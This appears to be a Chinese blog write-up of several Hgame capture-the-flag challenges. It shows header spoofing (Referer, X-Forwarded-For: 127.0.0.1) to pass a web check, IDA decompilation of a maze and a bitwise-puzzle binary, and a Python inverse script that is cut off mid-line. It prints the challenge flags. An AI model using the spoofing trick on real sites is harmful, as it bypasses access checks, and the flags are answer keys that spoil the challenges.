        <content type="html"><![CDATA[<html><head></head><body><p>记录一下Hgame的部分题解和一些解题时的思路</p><span id="more"></span><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://vidar.club</span><br></pre></td></tr></tbody></table></figure><p>然后提示需要从本地访问，添加响应头：</p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1</span><br></pre></td></tr></tbody></table></figure><p>接着提示flag会在2077年更新，所以添加响应头：</p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</span><br></pre></td></tr></tbody></table></figure><p>再发送请求得到flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{W0w!Your_heads_@re_s0_many!}</span><br></pre></td></tr></tbody></table></figure><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="hljs-keyword">char</span> *)&amp;unk_6020C4;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v4 &lt; <span class="hljs-built_in">SHIDWORD</span>(v4) )</span><br><span class="line">  {</span><br><span class="line">    v3 = s[(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v4];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 += <span class="hljs-number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">115</span> )</span><br><span class="line">      {</span><br><span class="line">        v5 += <span class="hljs-number">64</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">119</span> )</span><br><span class="line">        {</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">        }</span><br><span class="line">        v5 -= <span class="hljs-number">64</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">97</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_12;</span><br><span class="line">      v5 -= <span class="hljs-number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v5 &lt; (<span class="hljs-keyword">char</span> *)&amp;unk_602080 || v5 &gt; (<span class="hljs-keyword">char</span> *)&amp;unk_60247C || *(_DWORD *)v5 &amp; <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="hljs-built_in">LODWORD</span>(v4) = v4 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 == (<span class="hljs-keyword">char</span> *)&amp;unk_60243C )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">sprintf</span>(&amp;v7, <span class="hljs-string">"hgame{%s}"</span>, s, v4);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You win!"</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Flag is: "</span>);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(&amp;v7);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You died"</span>);</span><br><span class="line">  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br></pre></td></tr></tbody></table></figure><p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p><p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" alt="maze"></p><p>即从（2，2）位置走到（15，16）位置</p><p>所以最后的flag为</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{ssssddddddsssssddwwdddssssdssdd}</span><br></pre></td></tr></tbody></table></figure><h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p><p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//只贴出了有用的部分并且稍做了排版</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+11h] [rbp-5Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+12h] [rbp-5Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [rsp+13h] [rbp-5Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// [rsp+15h] [rbp-5Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [rsp+16h] [rbp-5Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+17h] [rbp-59h]</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v16; <span class="hljs-comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+40h] [rbp-30h]//地址是连续的，flag中间的具体内容是v24和v25起始的两个16</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [rsp+41h] [rbp-2Fh]//字节</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [rsp+42h] [rbp-2Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [rsp+43h] [rbp-2Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [rsp+44h] [rbp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [rsp+45h] [rbp-2Bh]</span></span><br><span class="line">  __int16 v24; <span class="hljs-comment">// [rsp+46h] [rbp-2Ah]</span></span><br><span class="line">  __int16 v25; <span class="hljs-comment">// [rsp+56h] [rbp-1Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// [rsp+66h] [rbp-Ah]</span></span><br><span class="line">  <span class="hljs-built_in">sub_4007E6</span>();<span class="hljs-comment">//只负责输出，没什么功能</span></span><br><span class="line">  v6 = <span class="hljs-number">76</span>;v7 = <span class="hljs-number">60</span>;v8 = <span class="hljs-number">214</span>;v9 = <span class="hljs-number">54</span>;v10 = <span class="hljs-number">80</span>;v11 = <span class="hljs-number">136</span>;v12 = <span class="hljs-number">32</span>;v13 = <span class="hljs-number">204</span>;</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%39s"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s) == <span class="hljs-number">39</span> &amp;&amp; s == <span class="hljs-string">'h'</span> &amp;&amp; v19 == <span class="hljs-string">'g'</span> &amp;&amp; v20 == <span class="hljs-string">'a'</span> &amp;&amp; v21 == <span class="hljs-string">'m'</span> &amp;&amp; v22 == <span class="hljs-string">'e'</span> &amp;&amp; v23 == <span class="hljs-string">'{'</span> &amp;&amp; v26 == <span class="hljs-string">'}'</span> )<span class="hljs-comment">// 共39位，hgame{***}格式</span></span><br><span class="line">  {</span><br><span class="line">    v14 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v15 = <span class="hljs-number">0</span>;</span><br><span class="line">    v16 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v17 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-comment">//这两条命令进行第一部分运算</span></span><br><span class="line">    <span class="hljs-built_in">sub_400616</span>((__int64)&amp;v14, (__int64)&amp;v24);   <span class="hljs-comment">// 传入地址，对flag中的部分进行操作</span></span><br><span class="line">    <span class="hljs-built_in">sub_400616</span>((__int64)&amp;v16, (__int64)&amp;v25);</span><br><span class="line">     </span><br><span class="line">    <span class="hljs-comment">//这里开始进行第二部分运算</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xE0</span>) &gt;&gt; <span class="hljs-number">5</span>) | <span class="hljs-number">8</span> * *((_BYTE *)&amp;v14 + i);<span class="hljs-comment">// &amp;v14 + i前三位与后五位交换位置</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xAA</span>;<span class="hljs-comment">// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) = <span class="hljs-number">2</span> * (*((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span>) ^ *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span> | *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0x55</span>;<span class="hljs-comment">// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xAA</span>;<span class="hljs-comment">// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">    }                                           </span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">//这里进行第三部分运算</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">7</span>; ++j )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       <span class="hljs-comment">// v6 = 76;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v7 = 60;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v8 = 214;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v9 = 54;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v10 = 80;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v11 = 136;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v12 = 32;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v13 = 204;</span></span><br><span class="line">      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )<span class="hljs-comment">// e4sy_Re_</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"sry, wrong flag"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);<span class="hljs-comment">// v6 = 76;</span></span><br><span class="line">                            <span class="hljs-comment">//这里异或之后又变成了V14最初始的值     //   v7 = 60;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v8 = 214;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v9 = 54;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v10 = 80;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v11 = 136;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v12 = 32;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v13 = 204;</span></span><br><span class="line">      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )<span class="hljs-comment">// Easylif3</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Just one last step"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulations! You are already familiar with bitwise operation."</span>);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Flag is your input."</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//sub_400616() 第一部分运算所用到的函数</span></span><br><span class="line"><span class="hljs-function">_BYTE *__fastcall <span class="hljs-title">sub_400616</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _BYTE *result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &lt;= <span class="hljs-number">96</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &gt; <span class="hljs-number">102</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &lt;= <span class="hljs-number">47</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &gt; <span class="hljs-number">57</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) - <span class="hljs-number">48</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) - <span class="hljs-number">87</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &lt;= <span class="hljs-number">96</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &gt; <span class="hljs-number">102</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &lt;= <span class="hljs-number">47</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &gt; <span class="hljs-number">57</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_17;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="hljs-number">16</span> * *result + *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) - <span class="hljs-number">48</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="hljs-number">16</span> * *result + *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) - <span class="hljs-number">87</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</span></span><br></pre></td></tr></tbody></table></figure><p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># 第三部分逆运算</span></span><br><span class="line">v = [<span class="hljs-number">76</span>, <span class="hljs-number">60</span>, <span class="hljs-number">214</span>, <span class="hljs-number">54</span>, <span class="hljs-number">80</span>, <span class="hljs-number">136</span>, <span class="hljs-number">32</span>, <span class="hljs-number">204</span>]</span><br><span class="line">v0 = <span class="hljs-string">'e4sy_Re_'</span></span><br><span class="line">v14 = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v0)):</span><br><span class="line">    v14.append(<span class="hljs-built_in">ord</span>(v0[i]) ^ v[i])</span><br><span class="line"><span class="hljs-comment"># print(v14)</span></span><br><span class="line"></span><br><span class="line">v16 = []</span><br><span class="line">v1 = <span class="hljs-string">'Easylif3'</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v1)):</span><br><span class="line">    v16.append(<span class="hljs-built_in">ord</span>(v1[i]) ^ v14[i])  <span class="hljs-comment"># v14经过两次和v的异或又变回了原本的值</span></span><br><span class="line"><span class="hljs-comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 第二部分逆运算</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x55</span>) ^ ((v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) | v14[i] &amp; <span class="hljs-number">0xAA</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v16[<span class="hljs-number">7</span> - i] = (<span class="hljs-number">2</span> * (v14[i] &amp; <span class="hljs-number">0x55</span>) ^ v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span> | v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0x55</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v16[7-i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x55</span>) ^ ((v16[<span class="hljs-number">7</span> - i] &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) | v14[i] &amp; <span class="hljs-number">0xAA</span>) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8, '0'))</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((v14[i] &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)) % <span class="hljs-number">256</span></span><br><span class="line">    <span class="hljs-comment"># print(bin(v14[i])[2:].rjust(8,'0'))</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># print(v14)</span></span><br><span class="line"><span class="hljs-comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 第一部分逆运算</span></span><br><span class="line">v24 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]</span><br><span class="line">v25 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]</span><br><span class="line">alphabet = [<span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span 